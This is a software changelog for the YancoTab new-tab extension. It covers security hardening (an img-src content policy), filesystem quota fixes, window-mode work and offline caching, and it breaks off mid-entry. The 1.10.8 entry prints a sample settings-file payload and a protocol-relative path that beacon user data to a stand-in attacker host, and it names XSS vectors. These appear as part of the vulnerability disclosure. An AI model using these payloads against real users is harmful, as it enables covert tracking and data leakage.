# Changelog

All notable changes to YancoTab will be documented in this file.

The format follows [Keep a Changelog](https://keepachangelog.com/).

---

## [1.10.9] — 2026-08-10

Defence in depth behind v1.10.8: images may now only come from places
we chose, so the beacon class is dead even if a future sink reaches an
image URL.

### Added — an `img-src` content-security policy

v1.10.8 closed the two routes by which an imported settings file could
smuggle an off-origin `url()` into the wallpaper. This closes the
category: the browser now refuses any image the policy does not name,
whatever code asked for it.

Declared twice, because the two products have different backstops:

- `manifest.json` → the extension's pages.
- a `<meta>` tag in `index.html` → the **standalone web app**, which
  has no manifest and until now had no policy at all.

Both allow exactly `'self' data: blob: https://s2.googleusercontent.com
https://*.gstatic.com` — local assets; Photos and custom wallpapers;
PDF page renders and thumbnails; and bookmark favicons.

### The part that would have broken everything

The favicon URL the code requests (`s2.googleusercontent.com`) **302s
to `t*.gstatic.com`**. CSP re-checks every redirect target and blocks on
the *destination* while reporting the *original* URI — so a policy
naming only the host we type kills every favicon in the product and
blames a URL that was, in fact, allowed.

That is not a deduction. The first candidate directive was exactly that,
and the browser blocked all five quick-link favicons; the redirect only
became visible by opening the URL in a policy-free tab and reading where
it landed. Both hosts are required and the test says so, in those words,
so nobody "tidies away" the redundant-looking one.

Verified live rather than reasoned about: with the policy active, a
`data:` image, a `blob:` image, a local asset and a real favicon all
load, an off-origin beacon is refused, and exercising Photos, PDF
Reader, Settings, Browser, Weather, all five page tabs and all six
wallpaper modes produced **one** violation — the deliberate beacon.

### Tests

2184 (+12). `tests/csp-img-src.test.js` asserts each source
individually with the reason it is there, pins the meta tag and the
manifest to each other so the web app and the extension cannot drift,
requires the meta tag to precede the first stylesheet (a policy declared
after loading starts governs less than it looks like it does), refuses
blanket sources (`*`, `https:`, `http:`) that would make the directive
decorative, and checks that the four favicon call sites request a host
the policy actually allows — so moving the favicon host again cannot
silently break icons.

Mutation-verified six ways: dropping the redirect host, removing the
directive, widening it to `*`, drifting the meta tag from the manifest,
deleting the meta tag, and pointing a call site at a disallowed host.

### Not covered

`connect-src`, `style-src` and `font-src` remain unrestricted. They
deserve the same treatment and the same live verification; bundling
them here would have meant shipping directives nobody had exercised.

---

## [1.10.8] — 2026-08-10

A security pass over every surface that accepts attacker-controlled
data. One real vulnerability, one false privacy disclosure, and a long
list of things that held.

### Fixed — an imported settings file could plant a tracking beacon

`yancotab_wallpaper` is registered with `validate: (v) => typeof v ===
'string'`, so **every** string passes. `resolveWallpaper` fell through
its branches to `{ kind: 'css', value: <the string> }`, which is
assigned to `shell.style.background`. A settings JSON containing

```json
{"yancotab_wallpaper":"#000 url(https://evil.example/beacon.png?u=victim)"}
```

therefore issued a request to an attacker's host **on every new tab**,
leaking IP, User-Agent and browsing cadence — invisibly, because an
unreachable URL simply paints nothing. The key's `syncPolicy` is
`'always'`, so `chrome.storage.sync` replicated it to the user's other
devices, and it survived restarts. The manifest declares no `img-src`,
so nothing blocked it.

The old comment on that branch reasoned that "the browser drops an
invalid declaration rather than reinterpreting the rest of the rule" —
which is true, and covers declaration *injection* only. It said nothing
about a perfectly **valid** declaration that fetches. That was the gap.
Arbitrary strings are no longer painted as CSS: anything that can issue
a request (`url()`, `image-set()`, `image()`, `cross-fade()`, `var()`,
`//`) falls back to the default wallpaper.

**A second route through the same attack** was found by the test written
for the first: `SAFE_PATH_RE` was `[A-Za-z0-9._\-/]+`, and
`//evil.example/b.png` is composed entirely of letters, dots and
slashes — so a protocol-relative URL passed as an innocent local asset
path and became `url("//evil.example/b.png")` via the *image* branch,
bypassing the CSS guard entirely. The pattern now rejects a doubled
slash; no real asset path contains one.

Not XSS: CSSOM refuses `red; color: blue` outright, verified. This was
exfiltration only.

### Fixed — the in-app privacy panel named the wrong favicon host

Settings' privacy panel listed `s2.googleusercontent.com` (Google's
cookieless static host) while all four call sites actually requested
`www.google.com/s2/favicons` — the **cookied** domain, so a
`SameSite=None` Google cookie rode along with every bookmark icon,
associating the user's Google identity with every domain they bookmark,
on every home-screen render. `privacy.html` said `www.google.com`, so
the product's two disclosures also contradicted each other.

Resolved in the direction that helps the user: the four call sites now
use the cookieless host — verified live that it returns an identical
32×32 icon before switching, so favicons could not break silently — and
`privacy.html` was corrected to match. The Browser's portal tiles also
gained the `referrerpolicy="no-referrer"` that PagePanes already had.

### Checked and found safe

Recorded because the negative results are the point of a security pass.
Each was executed against the running app, not reasoned about:

- **Markdown renderer** (the only dynamic `innerHTML` in the codebase) —
  14 payloads mounted the way the Notes preview mounts them: none
  executed. `javascript:`/`data:`/`vbscript:`/`file:`/`blob:`/
  protocol-relative produce no anchor at all; raw HTML is escaped;
  images are never emitted as `<img>`.
- **`isSafeUrl`** — 19 bypasses (case, leading whitespace, tab/newline/
  NUL, zero-width unicode, `java\tscript:`, protocol-relative) all
  rejected; it parses with the WHATWG URL parser rather than matching
  strings.
- **Prototype pollution** — five payload shapes inside *valid* export
  envelopes (top-level, nested in a value, `constructor.prototype`,
  array element, deep): no pollution. `importAll`'s stripping is
  recursive and array-aware.
- **SVG shortcut icons** — handlers stripped, `<script>` removed,
  `<foreignObject>` and `<use xlink:href="data:">` rejected outright.
- **Manifest** — MV3, `storage` only, no host permissions, `frame-src`
  pinned to one host, and no `eval`/`new Function` anywhere.
- **`setLiteralHtml`** — all 29 call sites are static constants; none
  interpolates a variable.
- **Uploads** — 10 MB image/file caps, 5 MB wallpaper, PDF verified by
  magic bytes rather than MIME.
- **Network** — zero third-party requests across boot and opening all
  22 apps in the default configuration.

### Known — not fixed here

- `setLiteralHtml`'s docblock claims "any scripts in the markup never
  execute". `<script>` indeed does not, but `<img onerror>` and
  `<svg><animate onbegin>` **do**. No attacker-controlled string reaches
  that sink today (the user-supplied icon path correctly uses
  `parseSafeSvg`), so this is a comment that invites future misuse
  rather than a vulnerability.
- `codexAnnotations.js` builds a `Function()` for calc-on-selection.
  The extension CSP has no `unsafe-eval`, so it throws and is swallowed
  into a "Calc failed" toast — the feature has never worked in the
  shipped extension. Same class as the v1.9.2 OCR path.
- `readCustomImage()` does not unwrap the AppStorage envelope while
  `readMarker()` does, so a custom wallpaper restored via import never
  applies.
- Adding an `img-src` CSP directive would kill this whole bug class as
  defence in depth, but it needs its own enumeration of every legitimate
  image source (`data:` photos, `blob:` PDF pages, favicons) and its own
  verification — rushing it into this release could break images
  silently.

### Tests

2172 (+13). The beacon suite covers eleven fetching markers across both
branches, and asserts in the same breath that legacy gradients, hex
colours, shipped themes, presets and `url("assets/…")` paths still
resolve — a guard that quietly reset everyone's wallpaper would be its
own bug. Verified live end-to-end: before the fix the beacon request
appeared in the network log; after it, all three attack shapes fall back
to the default wallpaper and no request is made.

---

## [1.10.7] — 2026-08-10

Found by auditing the codebase for its recurring bug — code that looks
wired and isn't. A full disk did not merely fail to save; renaming a
file destroyed it.

### Fixed — the filesystem lied about every write

Every write to the virtual filesystem funnels through
`FileSystemService._save()`. It caught `QuotaExceededError`, logged to
the console, and dispatched `yancotab:storage-full` under a comment
reading *"Dispatch event so the UI layer can handle gracefully"*.

**Nothing listened to that event.** One dispatch, one entry in
`KNOWN_EVENTS`, zero listeners in the entire repo — for its whole life.

`_save` also returned nothing, and its caller ignored that anyway:

```js
write(path, content, meta = {}) { …; this._save(path, file); return true; }
```

So on a full disk, `write()` reported success while nothing was
written. That covers Notes' autosave, every Files create/rename/move,
and PDF import — the note editor showed its "saved" state, the user
closed the window, and the text was gone. The project already had the
right tool for this (`utils/safeSave.js` surfaces exactly this failure
for `kernel.storage` writes); the filesystem simply bypassed it.

### Fixed — renaming a file on a full disk destroyed it

`rename()` is copy-then-delete:

```js
this._save(newPath, item);
localStorage.removeItem(this._key(oldPath));
```

With the copy refused and its failure unreported, the delete ran
anyway. The destination never existed and the source was removed — not
a failed rename, an erased file. The recursive directory branch had the
same shape per child, so one refused copy mid-loop destroyed that child
too.

`rename` now throws before touching the source. It throws rather than
returning false — unlike `write()` — because its failure mode is
destructive and its callers already wrap it in try/catch and toast
"Rename failed", so the error surfaces for free. `write()` keeps
returning a boolean instead: its hot caller is a 300ms autosave, where
a throw would surface as an unhandled rejection on every keystroke.

`write()` and `mkdir()` now return the real result.

### Fixed — the event finally has a listener

`mobileShell` bridges `yancotab:storage-full` to a toast, the same
pattern v1.6.0 used for the seven orphaned `yancotab:notify` sites. It
is deduped per session (a failing autosave would otherwise queue a
toast every few keystrokes — the reasoning `safeSave` already uses) and
emitted as `error`, so v1.10.5's alert exemption keeps Pomodoro's
auto-mute from hiding it. A data-loss warning that a focus break can
swallow would be the same bug in a new place.

### Tests

2159 (+13). `tests/fs-quota.test.js` drives the real service against a
localStorage mock with a quota switch: `write()` returns false and does
not persist, the event fires, a non-quota failure returns false
*without* claiming the disk is full, `mkdir` reports honestly, and —
the case the suite exists for — a refused rename leaves the source
file, its content, and a refused directory child intact, while normal
renames still move and clean up. A source check pins the shell bridge
and its `error` severity.

Mutation-verified seven ways, each caught: restoring `return true`,
making `_save` swallow again, deleting the source after a refused copy
(both the file and the directory-child variants), dropping the event,
removing the shell listener, and demoting the toast to a severity the
Pomodoro mute hides.

### Verification note

The unit tests are deterministic and the shell bridge was confirmed
live (the toast renders, carries `role="alert"` and the alert class,
and five further events produce no duplicates). A full end-to-end
reproduction against a genuinely exhausted origin was attempted and
abandoned: the running app competes for the same localStorage and
prunes it, so the signal was not clean enough to claim. The quota
branch itself is therefore proven by mock and by mutation, not by a
live disk-full reproduction.

---

## [1.10.6] — 2026-08-10

The last follow-up from the v1.10.0 window-mode review. Escape was
closing the window out from under the thing that had just handled it.

### Fixed — Escape is a fallback again, not a pre-emption

The shell's Escape handler closed the focused window on *any* Escape,
ahead of both the app and the focused text field. Two consequences,
both reproduced in the browser before the fix:

- **An app that already handled Escape got its window closed anyway.**
  Calculator's own handler clears the display on Escape and calls
  `preventDefault()` — the shell then closed the window on top of it,
  so the clear was never even visible. The same shape hit Notes' find
  bar (dismissing the bar threw the note's window away), Files'
  clear-selection, and every popover and context menu that dismisses
  on Escape. The shell never checked `defaultPrevented`, so an app
  saying "I handled this" meant nothing.
- **Typing in a text field and pressing Escape closed the window.**
  The key that dismisses a typo was also the key that tore the window
  down.

Escape now resolves in one place (`escapeAction` in
`os/ui/shellShortcuts.js`):

1. `preventDefault()` already called → the app handled it; the shell
   does nothing.
2. Focus is in a text field → blur it. A second Escape, with the field
   released, closes the window.
3. Otherwise → close the focused window, exactly as before.

Neither rule is invented here. Focus Mode has used the two-stage blur
since v1.3.0 — "the key that dismisses a typo isn't also the key that
tears down the screen" — and **MailApp had already worked around the
shell locally**, calling `stopPropagation()` only when it had something
to cancel and otherwise letting Escape through. This generalizes
MailApp's rule so every app gets it by calling the standard
`preventDefault()`, and makes the shell agree with Focus Mode.

Escape with no window focused still closes nothing, so a minimized
window cannot be killed from the tray by a stray keypress.

### Tests

2146 (+10). `tests/shell-escape.test.js` covers the decision as a pure
function across the full matrix, including the two regressions by name
and the property that no combination closes a window when none is
focused. The suite also pins the wiring, so the predicate cannot be
bypassed at the call site.

Mutation-verified five ways — ignoring `defaultPrevented`, removing
the blur stage, restoring the historical close-before-blur ordering,
closing with no focused window, and bypassing the predicate — each
caught by the test written for it.

Verified live: Escape in Calculator now clears without closing; a
plain Escape still closes; Escape in the Browser's URL bar blurs the
field and leaves the window open, and a second Escape closes it.

---

## [1.10.5] — 2026-08-10

The last item from the v1.10.3 z-order audit: the one remaining way a
toast could be silenced was a `display: none` on every toast in the
product, and it was on by default.

### Fixed — a Pomodoro break could swallow "Save failed"

Pomodoro's `autoMute` setting hides toasts during a break so the user
is not interrupted. It did so with a blanket rule
(`body.pomodoro-mute .toast-pill, .toast-container { display: none }`),
and `autoMute` **defaults to on** — so for most users, on most breaks,
every toast in the product was hidden. Not just Pomodoro's.

Of the 193 toast emit sites, 85 are `type: 'error'`, and they are
overwhelmingly reports that something did **not** happen: "Save
failed", "Storage full — could not save wallpaper", "Import failed",
"Rename failed", "Could not save mail accounts", plus every
`safeSave` quota failure and the "Blocked unsafe URL" security refusal.
Hiding those does not create calm. It makes a failed save look like a
successful one — the toast is the only evidence the user ever gets.

Toasts now split by severity (`os/ui/components/toastSeverity.js`):

- **Alert** — `error` and `warning`. Something failed or was refused.
  Marked `.toast-pill--alert` and exempt from the mute.
- **Routine** — `success` and `info`. Confirmations of things that
  worked. Still muted; this is what the setting is *for*, and it is
  still the large majority of traffic (106 of the 193 sites).

`warning` is on the alert side because both of its uses ("Window limit
reached", "Account list is full") explain why an action the user just
took did nothing; swallowing that reads as a broken app. An unknown or
malformed type falls to routine, so a typo cannot quietly pierce the
mute.

The mute rule also **stopped hiding `.toast-container`**. That line was
load-bearing in the wrong direction: the container is the parent of
every pill, so hiding it would have hidden the exempt alerts too — and
it carries `role="status" aria-live="polite"`, so hiding it would also
have stopped screen readers announcing the alerts that survive. The
dead `.toast` selector went with it; nothing has created that class
since the pill rewrite.

Deliberately unchanged: `role="alert"` is still applied to errors only.
Which toasts interrupt speech is an accessibility question, separate
from which ones render at all.

### Tests

2136 (+9). `tests/toast-mute.test.js` pins both halves — an exemption
that leaked to every type would quietly delete the feature, so the
suite asserts routine toasts are still hidden as firmly as it asserts
alerts are not. Covers the severity split against malformed types, that
Toast.js drives the class from the predicate rather than a hardcoded
type, that the CSS exempts the alert class, and that no mute rule hides
the container.

Mutation-verified five ways: restoring the blanket rule, hiding the
container alongside the exemption, demoting `warning`, widening the
exemption to every type, and dropping the marker in Toast.js. Each
turns the suite red.

Verified live end-to-end with real toasts through the real
ToastManager under an engaged mute: the window-cap warning
("Window limit reached") rendered with `.toast-pill--alert`, a routine
`info` toast beside it did not, and the container stayed rendered.

The new module was also the first real exercise of v1.10.4's
closure guard — the suite failed until it was precached.

---

## [1.10.4] — 2026-08-10

Eight apps could not open at all offline in the standalone web app.
Found while verifying v1.10.2, fixed here with the guard that should
have caught it.

### Fixed — 84 modules the precache never listed

The service worker's fetch handler is precache-or-network with no
runtime `cache.put`, so a module absent from `PRECACHE` is simply
unavailable offline. An ES module graph is all-or-nothing, so one
absence takes its entire app down.

`PRECACHE` was hand-maintained and had drifted badly:

- **69 statically-imported modules** were missing across Browser (15),
  Notes (15), Solitaire (13), Settings (11), Todo (9) and PDF (4),
  plus `utils/safeSave.js` and `utils/notes-utils.js`. Every one of
  those apps is itself precached — and none of them could open.
- **Four whole apps** — Maps, PDF Reader, Photos and Pomodoro — were
  never listed at all. They reach the runtime only through `boot.js`'s
  lazy `import()`, and that import had nothing to load from offline.

The list is now the full import closure of every precached entry:
481 unique entries, verified to exist on disk before shipping, because
one bad path makes `cache.addAll()` reject and silently disables
offline support wholesale. A pre-existing duplicate entry
(`games/shared/store.js`, listed twice) is also gone.

Dynamic `import()` edges are followed as well as static ones. The
distinction that matters offline is not how a module is imported but
whether it is in the cache: a dynamic import that misses fails just as
hard, only later and inside somebody's catch.

### Why nothing caught it

v1.6.0 added a guard for exactly this failure — but it walks the
static import graph from the **boot entries** only, and stops there on
purpose, because lazy apps legitimately load after boot. Everything
past that boundary was unguarded, which is the entire surface where
this drifted.

`tests/asset-refs.test.js` now also asserts the precache is **closed
under import**: the full static+dynamic closure of every precached
entry must itself be precached. Plus two anti-vacuity tests (the
closure must reach 400+ modules, and must still follow the dynamic
edge to `MapsApp.js`), a check that the codebase still contains no
`export … from` re-exports — an edge form the walker does not follow,
which would silently shrink the closure — and a no-duplicates check.

Mutation-verified five ways: removing one module, removing a lazy app
entry, reverting all 84 additions to the exact historical state,
re-introducing the duplicate, and adding a re-export edge. Each turns
the suite red.

### Verified offline, not inferred

The dev server was **stopped** and the network confirmed dead
(`fetch` rejecting) before reloading. The shell booted from cache and
all eight formerly-broken apps opened: Notes, Browser, Todo, Settings,
Maps, Pomodoro, Photos, Solitaire — no errors, no "Boot Module
Missing".

The failure mechanism was then demonstrated rather than assumed: with
`notes/engine/meta.js` evicted from the live cache, Notes stopped
opening offline while Todo, whose graph was intact, still opened. No
error reached the console in that state — the rejected import is
swallowed by the process manager's error path, which is why this was
invisible for so many releases.

Only the standalone web app is affected; the extension ships no
service worker (`pack-extension.sh` excludes it).

### Tests

2127 (+4). Cache bumped to `yancotab-v1.10.4-offline-graph` so
existing installs re-precache.

---

## [1.10.3] — 2026-08-10

The third follow-up from the v1.10.0 window-mode review — except the
finding it set out to fix turned out not to be real. Measuring it
produced a different bug, a dead element, and the documentation that
stops the same false diagnosis being made a fourth time.

### Not a bug — toasts were never buried by app windows

The report (mine, in the v1.10.0 notes) was that `--z-toast: 800` sits
below the app layer's legacy `z-index: 2000 !important`, so any open
window hides every toast, including security blocks and quota errors.

Those two numbers are not comparable. `#app` has `z-index: auto` and so
forms **no stacking context**, which means the shell competes at the
root as `#app-shell` — `z-index: 1`. Everything inside it, the 2000
layer included, is sealed under that 1 and can never outrank a
root-level sibling however large the number gets. `.toast-container` is
appended to `document.body` by `Toast.js`, deliberately not into the
shell, so the comparison that actually decides paint order is 800 vs 1.

Measured rather than argued, with a window positioned over the toast
strip: `elementsFromPoint` at the toast's centre returns
`toast-pill → toast-container → calc-display-result → calc-display`.
The toast paints above the app's own content, inside the 2000 layer.

Nothing was raised. Lifting `--z-toast` toward the tier-2 numbers would
have changed no pixel and would have written the wrong mental model
into the tokens permanently.

### Removed — a dead container that outranked every toast

Measuring the root stacking context to check the above turned up
`#app-windows`: an empty `position: fixed; inset: 0; z-index: 1000`
div in `index.html`, styled in two stylesheets, referenced by no
JavaScript, holding zero children — left over from the pre-v1.0
architecture along with the `.placeholder-window` class it targeted.

At z-index 1000 it was the **only** root-level element ranked above
`.toast-container` (800), and it is named exactly like the thing a
future reader would mount windows into. Harmless the day it was
measured, load-bearing the day someone used it. App windows live in
`.m-app-layer` inside the shell; the div and its two CSS blocks are
gone.

### Changed — the z-index scale documents its two tiers

The scale had grown a comment (added in v1.10.0) telling readers that
the window tray "must clear `.m-app-layer`'s legacy 2000" — true within
the shell, and precisely what invites the cross-tier comparison that
produced this false report. `css/tokens.css` now leads with the split:

- **Tier 1**, root stacking context: `#starfield 0 < #app-shell 1 <
  .toast-container 800 < .boot-screen 9999`.
- **Tier 2**, inside `#app-shell`: everything from `--z-grid` to
  `--z-alarm`, plus the legacy 2000. Comparable only with each other.

`--z-toast` now records that its placement on `document.body`, not its
value, is what puts toasts above windows.

### Tests

2123 (+8). `tests/z-order.test.js` locks the invariant that no number
in the scale can express: the toast container is appended to
`document.body`; `#app-shell` stays below `--z-toast` in every
stylesheet; `--z-focus` stays below `--z-toast` (the v1.3.0 rule); no
id in `index.html` is given a z-index at or above `--z-toast` except
the boot and fatal screens; and `#app-windows` stays gone. The two-tier
comment itself is asserted, because losing it is how the next false
diagnosis starts.

Mutation-verified five ways, each caught by the test written for it:
restoring `#app-windows` exactly as it was, mounting the toast
container inside the shell, raising `#app-shell` above `--z-toast`,
raising `--z-focus` above `--z-toast`, and deleting the two-tier note.
The first of those is the important one — this guard would have caught
the dead container on the day it was added.

### Known — the one way a toast really can be silenced

`body.pomodoro-mute` resolves to
`.toast-container { display: none !important }` (`css/pomodoro.css`),
so while Pomodoro auto-mute is engaged every toast in the product is
hidden — security blocks and quota errors included. That is deliberate
and already bounded to the Pomodoro window's lifetime (v1.7.0
deliberately declined to make it ambient for exactly this reason).
Untouched here: it is a product decision about a shipped feature, not
a z-order defect, and it deserves its own call rather than a rider.

---

## [1.10.2] — 2026-08-10

The second follow-up from the v1.10.0 window-mode review: two editor
windows can no longer be opened on the same note.

### Fixed — a second editor on one note silently reverted the first

Config-bearing spawns are never deduped by design (that is what lets
Files open two documents side by side), so all three Notes-editor
spawn sites — `NotesApp._openEditor`, `NotesApp._createNote`, and the
shell's file router — would happily open a *second* editor on a note
that already had one. Multi-window then put both on screen at once.

Each editor holds an in-memory buffer of the whole document and
flushes that whole buffer on a 300ms debounce, so the two do not
interleave edits — they overwrite each other wholesale, last save
wins. Merely *closing* the stale window is enough to revert the other's
work, because `destroy` calls `flushAll`.

What made it silent is a guard that is otherwise exactly right:
`editorFrame.update()` deliberately refuses to touch the body on an
external `notes:changed` for the same path ("don't clobber the body
the user might still be editing"), so the second editor is never told
its copy went stale. The persisted per-path undo history was being
fought over too.

This existed before multi-window — the leaked invisible process from
the v1.10.0 fix could hold the other editor — but it took two visible
windows to make it reachable on purpose.

### How

Apps now declare what a spawn config *owns*. `App.resourceKey(config)`
is a static returning a stable string for a config that may only ever
have one window, or null (the base) for one that may have many.
`NotesApp` returns `notes:editor:<path>` for editor configs and null
for library configs — a library window holds no buffer and syncs via
`notes:changed`, so several may coexist, and `payload.path` there is
only an initial selection.

ProcessManager enforces it: a spawn whose key matches a live process
emits `process:reused` and returns that pid, which the window manager
already handles by focusing and restoring the window. Ownership is app
knowledge, so the app declares it; "don't run two processes for one
resource" is process policy, so the process manager enforces it — and
all three spawn sites inherit the rule instead of carrying three copies
that drift.

The check sits inside `_doSpawn`, after the class resolves and before
the spawn claims a pid. That placement is load-bearing: it also covers
a rapid double-open, because the first spawn's record exists from the
moment its class resolved and a second caller reaches the check only
after awaiting that same cached import — so it always sees the
`starting` record. A `closing` process is skipped, so re-opening a note
during its window's close animation spawns fresh rather than focusing a
window committed to dying.

Paths are compared verbatim — not trimmed, not case-folded.
FileSystemService normalizes nothing, so `/a.txt` and ` /a.txt` really
are different files to it, and merging them would focus a window
editing a different document.

### Tests

2115 (+20). `tests/notes-resource-key.test.js` covers the decision
itself against hostile configs (non-string paths, near-miss modes,
non-object configs — a key built from a non-path would collapse every
editor onto one window). The process-manager suite gains the
enforcement: same path reuses, different paths stay concurrent,
library configs are never deduped, an open editor does not satisfy an
icon tap (nor the reverse), concurrent opens share one process, a
closing editor is not reused, a killed one frees its path, keys do not
leak across apps, and a throwing or non-string `resourceKey` degrades
to "owns nothing" rather than taking the spawn down.

Mutation-verified five ways: removing the check, dropping `starting`
from the match, dropping the `closing` guard, dropping `appId` from the
match, and treating library configs as owned each turn the suite red,
every one caught by the test written for it. Verified live through the
real shell → process-manager → window-manager chain: three consecutive
opens of one note left the window count unchanged and focused the
existing editor, reopening while minimized restored it, and a second
note still opened its own window — with no new console errors.

### Known — unrelated, found while verifying

The service worker's precache is missing **69 statically-reachable
modules** across Browser, Notes, Games, Settings, Todo and PDF (for
example `notes/engine/meta.js`, `notes/view/sideRail.js`). Because the
fetch handler is precache-or-network with no runtime caching and an ES
module graph is all-or-nothing, those apps cannot open offline in the
standalone web app. This is the v1.6.0 bug class again, but for
*lazy-loaded* apps, which the existing boot-graph guard deliberately
does not walk. Untouched here — it needs its own fix and its own guard
test rather than riding along, and it does not affect the extension,
which ships no service worker.

---

## [1.10.1] — 2026-08-10

The first follow-up from the v1.10.0 window-mode review: games now
honor the pause signal the window manager sends. Before this, a
minimized game's process stayed alive with nothing listening — every
second minimized counted toward best times, and a minimized Snake
kept playing itself into a wall.

### Fixed — minimized game clocks kept counting

`onSignal('pause'/'resume')` is now implemented in every game that
keeps time, each in its natural place:

- **Solitaire / Spider** delegate to their own pause machinery (freeze
  + menu). `resume` is deliberately not handled: the restored window
  shows the paused menu and the player continues consciously — a timed
  game must not restart its clock silently.
- **Minesweeper** freezes the solve clock (`timerStart` shifts past the
  minimized gap on restore) and halts the render loop — the rAF loop
  used to keep drawing into a `display:none` canvas at full speed,
  because window-manager minimize never sets `document.hidden`.
- **Mahjong** gains real pause accounting in the pure engine
  (`pause()/resume()/elapsedSecs(now)` — elapsed was previously a bare
  `Date.now() - startTime` that nothing could freeze). The per-second
  chrome repaint stops while minimized.
- **Memory** gains `PAUSE`/`RESUME` reducer actions: `PAUSE` stamps
  `pausedAt`, `RESUME` shifts `startedAt` forward by the paused
  duration, so `bestTimeMs` — computed at win as
  `finishedAt - startedAt` — never includes minimized time. `FLIP` is
  rejected while paused.
- **Snake** pauses the sim and stops the loop; restore re-arms the loop
  but stays on the pause overlay. A minimized round previously kept
  moving — and dying — at full rAF speed.

### Fixed — two pre-existing bugs surfaced by the same work

- **Snake's HUD clock never paused.** `paused` was flipped by direct
  assignment in seven places and `_roundStartedAt` was never adjusted,
  so the displayed elapsed time kept climbing through every pause the
  game has ever had. All seven sites now route through one `setPaused`
  gate that shifts the round clock, and the shell reads
  `roundElapsedMs()` instead of raw fields.
- **Solitaire/Spider's menu "Continue" reset the clock.** It reloaded
  the save — whose `timeSec` is only written on moves — so continuing
  a paused game snapped time back to the last move and lost the seconds
  since (verified live: 00:03 became 00:01). A paused live game now
  continues in place via `_resume()`; the save-reload path remains for
  cold starts.

The resume paths only restart a loop that pause itself stopped, so a
window minimized during its first frames cannot race `_pollStart` into
two concurrent render loops.

### Tests

2095 (+13): Memory's `PAUSE`/`RESUME` accounting (stamp, shift,
repeated cycles, win-time exclusion, `FLIP`-while-paused, `NEW_GAME`
reset) and a new `tests/mahjong-pause.test.js` for the engine clock —
all driven through injectable `now` values, no wall-clock patching.
Mutation-verified: deleting either engine's resume shift turns its
suite red. Verified live end-to-end: Solitaire froze at 00:03 through a
2.5s minimize and continued to 00:05; Snake's HUD held 0:00 through a
paused wait and ran again after unpausing.

### Service worker

Cache bumped to `yancotab-v1.10.1-game-pause`.

---

## [1.10.0] — 2026-08-10

Desktop Window Mode — the last big unbuilt item on the production plan
(§4.6). The new tab is no longer one app at a time: on desktop-size
screens, apps open in concurrent floating windows with focus, minimize,
a window tray, and edge snapping.

### Added — real multi-window on desktop

On viewports ≥1024px with a fine pointer (`body.wm-multi`), up to six
apps run in floating windows at once:

- **Focus & z-order** — pointer down anywhere on a window raises and
  focuses it. Unfocused windows drop to a lighter shadow and a dimmed
  titlebar with no backdrop-filter — six live blur surfaces is real GPU
  cost that background windows don't need to pay.
- **Minimize** — a third traffic-light button. The process keeps
  running; the window returns from the tray or by relaunching the app.
- **Window tray** — a chip row (app name, focus state, close ×) that is
  the recovery surface for minimized windows whose app isn't in the
  dock. It mounts as a *sibling* of the app layer, deliberately: the
  layer hides when everything is minimized, and the tray must not share
  that fate.
- **Edge snap** — dragging a titlebar to the left/right viewport edge
  shows a glass preview and snaps the window to that half on release;
  the top edge maximizes. Dragging a snapped window away restores its
  pre-snap size, with the grab point rescaled proportionally so the
  titlebar stays under the pointer. Halves are computed with ceil/floor
  so an odd-width viewport tiles with no 1px seam.
- **Cascade** — each new window offsets 28px from its app's own CSS
  default position. Only left/top are written — width/height stay
  CSS-driven, so the per-app `:has()` sizing (the card salon's 90%×92%,
  Settings' centered `min()`) is untouched.
- **Show desktop** — the home button now minimizes all windows instead
  of killing the app. Escape still closes (the focused window only).
  Focus Mode entry minimizes rather than closes, so a focus session no
  longer destroys open work; it waits in the tray.

Small screens and coarse pointers keep today's single-visible-window
behavior. Crossing the gate by resizing (devtools!) minimizes the
background windows rather than killing them — resizing is an accident,
not an intent.

The architecture follows the game-engine discipline: all ordering,
focus, cascade and snap *decisions* live in a pure reducer-style module
(`os/ui/wm/wmCore.js`, zero DOM) with invariant-locked tests; the DOM
orchestrator (`WindowManager.js`) only applies them. One shared scrim
replaces the per-window scrims — two windows would have stacked
0.4 + 0.4 alpha into a near-black home screen.

### Fixed — re-opening a running app spawned a second process

`spawn()` deduped only *in-flight* empty-config spawns, so tapping the
icon of an app that was already running created a second process while
the first kept running invisibly behind the new window — a leak on
every re-tap, on every device, invisible only because the shell showed
one window at a time. The process manager now reuses the running
process (`process:reused`) and the window manager focuses its window.
Config-bearing spawns (Files opening two documents) still get fresh
windows on purpose.

### Fixed — `app:open` config ride-alongs never arrived

`kernel.emit(event, data)` forwards exactly one payload argument, so
the documented `emit('app:open', 'tarneeb', { preset })` pattern
silently dropped the config — every bus-emitted "open with config" has
been a plain open since v1.1.0. The Calculator's "open tape in Notes"
was the one live caller: it opened the Notes *library* instead of the
note. `app:open` now accepts `{ id, config }` as an object payload, the
calculator uses it, and malformed payloads are ignored rather than
spawned.

### Fixed — drag state stranded on pointercancel

WindowChrome's title-bar drag handled only `pointerup`, so a mid-drag
`pointercancel` (tab switch, system gesture) stranded the `--dragging`
class — `transition: none` and disabled pointer events on the window's
content, permanently. Both drag and the new snap path now tear down on
cancel, and `setPointerCapture` is guarded — an uncapturable pointer
used to throw mid-handler, which is exactly the stranding path again.

### Hardened — a 26-agent adversarial review of the diff

Five parallel reviewers (lifecycle, pointer/drag, regressions, CSS/theme,
a11y/security) produced 21 findings; each was independently verified
against the code, 19 survived, and 15 shipped as fixes in this release:

- **A plain click on a snapped or maximized titlebar un-snapped it.**
  Un-snap/un-maximize now waits for 6px of real movement — a click
  focuses, a drag restores. The WM's snap bookkeeping is deferred the
  same way, so a click that moved nothing no longer clears it.
- **Escape could close a different window than the one being typed in.**
  Window focus followed only pointerdown; tabbing into a background
  window's input left the WM aimed elsewhere. `focusin` now raises and
  focuses, so keyboard and window focus cannot diverge.
- **Minimizing the focused window dropped keyboard focus to `<body>`.**
  Focus is handed to the newly focused window (windows carry
  `tabindex="-1"`) — only when the previous holder actually went away,
  so click-to-focus never steals focus from app content.
- **The setMode rAF race.** A window closed in the same frame it opened
  let a stale `requestAnimationFrame` re-add the layer's active class
  after the home transition — scrim over a click-dead home screen until
  the next full open/close cycle. Each mode switch now cancels the
  opposing mode's pending rAF/timer.
- **Relaunch during the 220ms close fade was swallowed.** The reuse
  check saw the dying process as `running` and focused a window
  committed to dying. Closing now marks the process `closing`, which
  the reuse check skips.
- **Reuse matched by appId alone**, so a Notes *editor* window made the
  Notes *library* unreachable from its icon. Only plain-opened
  processes are offered for reuse; config-bearing ones never are.
- **Snap bookkeeping went stale** three ways: manually resizing a
  snapped window, maximizing it via the green button, and viewport
  resizes while minimized (where `display:none` makes every measurement
  zero). Manual resize now clears the snap, fullscreen windows are
  skipped on viewport resize, and restore re-clamps to the viewport.
- **The ringing-alarm overlay painted UNDER open windows** — its
